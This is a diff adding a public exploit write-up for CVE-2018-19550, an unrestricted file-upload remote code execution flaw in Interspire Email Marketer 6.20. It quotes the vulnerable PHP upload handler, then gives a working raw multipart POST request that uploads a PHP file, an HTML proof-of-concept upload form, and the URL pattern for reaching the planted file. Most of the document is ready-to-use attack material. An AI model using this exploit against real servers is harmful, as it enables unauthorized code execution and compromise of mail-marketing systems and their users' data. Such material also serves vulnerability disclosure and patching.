@@ -1,0 +1,96 @@
+# Exploit Title: Interspire Email Marketer 6.20 - Remote Code Execution
+# Date: May 2019
+# Exploit Author: Numan Türle
+# Vendor Homepage: https://www.interspire.com
+# Software Link: https://www.interspire.com/emailmarketer
+# Version: 6.20< 
+# Tested on: windows
+# CVE : CVE-2018-19550
+# https://medium.com/@numanturle/interspire-email-marketer-6-20-exp-remote-code-execution-via-uplaod-files-27ef002ad813
+
+
+surveys_submit.php
+if (isset($_FILES['widget']['name'])) {
+             $files = $_FILES['widget']['name'];
+
+             foreach ($files as $widgetId => $widget) {
+                 foreach ($widget as $widgetKey => $fields) {
+                     foreach ($fields as $fieldId => $field) {
+                         // gather file information
+                         $name    = $_FILES['widget']['name'][$widgetId]['field'][$fieldId]['value'];
+                         $type    = $_FILES['widget']['type'][$widgetId]['field'][$fieldId]['value'];
+                         $tmpName = $_FILES['widget']['tmp_name'][$widgetId]['field'][$fieldId]['value'];
+                         $error   = $_FILES['widget']['error'][$widgetId]['field'][$fieldId]['value'];
+                         $size    = $_FILES['widget']['size'][$widgetId]['field'][$fieldId]['value'];
+
+                         // if the upload was successful to the temporary folder, move it
+                         if ($error == UPLOAD_ERR_OK) {
+                             $tempdir   = TEMP_DIRECTORY;
+                             $upBaseDir = $tempdir . DIRECTORY_SEPARATOR . 'surveys';
+                             $upSurveyDir = $upBaseDir . DIRECTORY_SEPARATOR . $formId;
+                             $upDir     = $upSurveyDir . DIRECTORY_SEPARATOR . $response->GetId();
+
+                             // if the base upload directory doesn't exist create it
+                             if (!is_dir($upBaseDir)) {
+                                 mkdir($upBaseDir, 0755);
+                             }
+
+                             if (!is_dir($upSurveyDir)) {
+                                 mkdir($upSurveyDir, 0755);
+                             }
+
+                             // if the upload directory doesn't exist create it
+                             if (!is_dir($upDir)) {
+                                 mkdir($upDir, 0755);
+                             }
+
+                             // upload the file
+                             move_uploaded_file($tmpName, $upDir . DIRECTORY_SEPARATOR . $name);
+                         }
+                     }
+                 }
+             }
+         }
+
+input file name : widget[0][field][][value]
+submit : surveys_submit.php?formId=1337
+
+
+POST /iem/surveys_submit.php?formId=1337 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF2dckZgrcE306kH2
+Content-Length: 340
+
+------WebKitFormBoundaryF2dckZgrcE306kH2
+Content-Disposition: form-data; name="widget[0][field][][value]"; filename="info.php"
+Content-Type: application/octet-stream
+
+<?php
+phpinfo();
+?>
+------WebKitFormBoundaryF2dckZgrcE306kH2
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryF2dckZgrcE306kH2-
+
+####
+
+POC
+
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<form action="http://WEBSITE/surveys_submit.php?formId=1337" method="post" enctype="multipart/form-data">
+    <input type="file" name="widget[0][field][][value]">
+    <input type="submit" value="submit" name="submit">
+</form>
+</body>
+</html>
+
+URL : http://{{IEM LINK}}/admin/temp/surveys/1337/{{FUZZING NUMBER}}/{{FILENAME}}
